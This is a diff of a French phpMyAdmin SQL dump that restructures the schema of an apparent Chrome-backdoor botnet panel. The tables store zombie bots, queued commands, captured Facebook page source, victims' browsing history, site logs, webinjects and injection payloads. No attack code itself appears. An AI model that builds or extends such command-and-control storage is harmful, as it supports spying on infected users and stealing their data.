@@ -1,11 +1,11 @@
 -- phpMyAdmin SQL Dump
--- version 4.0.10.7
+-- version 4.4.10
 -- http://www.phpmyadmin.net
 --
--- Client: localhost:3306
--- Généré le: Lun 11 Avril 2016 à 14:19
--- Version du serveur: 5.5.48-cll
--- Version de PHP: 5.4.31
+-- Client :  localhost:8889
+-- Généré le :  Mar 12 Avril 2016 à 12:39
+-- Version du serveur :  5.5.42
+-- Version de PHP :  7.0.0
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
 SET time_zone = "+00:00";
@@ -14,10 +14,10 @@ SET time_zone = "+00:00";
 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
 /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
 /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!40101 SET NAMES utf8 */;
+/*!40101 SET NAMES utf8mb4 */;
 
 --
--- Base de données: `zozqrvae_chromebackdoor`
+-- Base de données :  `chrombackdoor-master`
 --
 
 -- --------------------------------------------------------
@@ -26,13 +26,12 @@ SET time_zone = "+00:00";
 -- Structure de la table `action_wait`
 --
 
-CREATE TABLE IF NOT EXISTS `action_wait` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `action_wait` (
+  `id` int(11) NOT NULL,
   `zombie_name` text NOT NULL,
   `commande` text NOT NULL,
-  `used` int(11) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `used` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -40,14 +39,13 @@ CREATE TABLE IF NOT EXISTS `action_wait` (
 -- Structure de la table `bots`
 --
 
-CREATE TABLE IF NOT EXISTS `bots` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `bots` (
+  `id` int(11) NOT NULL,
   `name` text NOT NULL,
   `backdoor_name` text NOT NULL,
   `numbers_logs` int(11) NOT NULL DEFAULT '0',
-  `online` int(11) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `online` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -55,14 +53,13 @@ CREATE TABLE IF NOT EXISTS `bots` (
 -- Structure de la table `bot_settings`
 --
 
-CREATE TABLE IF NOT EXISTS `bot_settings` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `bot_settings` (
+  `id` int(11) NOT NULL,
   `setting_name` text NOT NULL,
   `setting_value` text NOT NULL,
   `bot_id` text NOT NULL,
-  `available` int(11) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `available` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -70,13 +67,13 @@ CREATE TABLE IF NOT EXISTS `bot_settings` (
 -- Structure de la table `facebookspy`
 --
 
-CREATE TABLE IF NOT EXISTS `facebookspy` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `facebookspy` (
+  `id` int(11) NOT NULL,
   `bot_id` int(11) NOT NULL,
   `source_code` longtext NOT NULL,
-  `new` int(11) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `date_last` text NOT NULL,
+  `new` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -84,13 +81,12 @@ CREATE TABLE IF NOT EXISTS `facebookspy` (
 -- Structure de la table `history_web`
 --
 
-CREATE TABLE IF NOT EXISTS `history_web` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `history_web` (
+  `id` int(11) NOT NULL,
   `website` text NOT NULL,
   `zombie` text NOT NULL,
-  `timevisit` text NOT NULL,
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `timevisit` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -98,16 +94,15 @@ CREATE TABLE IF NOT EXISTS `history_web` (
 -- Structure de la table `logs_checker`
 --
 
-CREATE TABLE IF NOT EXISTS `logs_checker` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `logs_checker` (
+  `id` int(11) NOT NULL,
   `id_zombie` int(11) NOT NULL,
   `url_site` text NOT NULL,
   `logs_site` text NOT NULL,
   `last` int(11) DEFAULT '0',
   `zombie` text NOT NULL,
-  `webinject` text NOT NULL,
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `webinject` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -115,13 +110,12 @@ CREATE TABLE IF NOT EXISTS `logs_checker` (
 -- Structure de la table `payloads`
 --
 
-CREATE TABLE IF NOT EXISTS `payloads` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `payloads` (
+  `id` int(11) NOT NULL,
   `name` text NOT NULL,
   `urlverif` text NOT NULL,
-  `codeinject` text NOT NULL,
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `codeinject` text NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -129,13 +123,12 @@ CREATE TABLE IF NOT EXISTS `payloads` (
 -- Structure de la table `utilisateurs`
 --
 
-CREATE TABLE IF NOT EXISTS `utilisateurs` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `utilisateurs` (
+  `id` int(11) NOT NULL,
   `username` text NOT NULL,
   `password` varchar(255) NOT NULL,
-  `bot` int(11) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;
+  `bot` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
 
 --
 -- Contenu de la table `utilisateurs`
@@ -150,14 +143,120 @@ INSERT INTO `utilisateurs` (`id`, `username`, `password`, `bot`) VALUES
 -- Structure de la table `webinject`
 --
 
-CREATE TABLE IF NOT EXISTS `webinject` (
-  `id` int(11) NOT NULL AUTO_INCREMENT,
+CREATE TABLE `webinject` (
+  `id` int(11) NOT NULL,
   `webinject_site` text NOT NULL,
   `webinject_code` text NOT NULL,
-  `webinject_status` int(11) NOT NULL DEFAULT '0',
-  PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+  `webinject_status` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
+--
+-- Index pour les tables exportées
+--
+
+--
+-- Index pour la table `action_wait`
+--
+ALTER TABLE `action_wait`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `bots`
+--
+ALTER TABLE `bots`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `bot_settings`
+--
+ALTER TABLE `bot_settings`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `facebookspy`
+--
+ALTER TABLE `facebookspy`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `history_web`
+--
+ALTER TABLE `history_web`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `logs_checker`
+--
+ALTER TABLE `logs_checker`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `payloads`
+--
+ALTER TABLE `payloads`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `utilisateurs`
+--
+ALTER TABLE `utilisateurs`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Index pour la table `webinject`
+--
+ALTER TABLE `webinject`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- AUTO_INCREMENT pour les tables exportées
+--
+
+--
+-- AUTO_INCREMENT pour la table `action_wait`
+--
+ALTER TABLE `action_wait`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `bots`
+--
+ALTER TABLE `bots`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `bot_settings`
+--
+ALTER TABLE `bot_settings`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `facebookspy`
+--
+ALTER TABLE `facebookspy`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `history_web`
+--
+ALTER TABLE `history_web`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `logs_checker`
+--
+ALTER TABLE `logs_checker`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `payloads`
+--
+ALTER TABLE `payloads`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `utilisateurs`
+--
+ALTER TABLE `utilisateurs`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
+--
+-- AUTO_INCREMENT pour la table `webinject`
+--
+ALTER TABLE `webinject`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
 /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
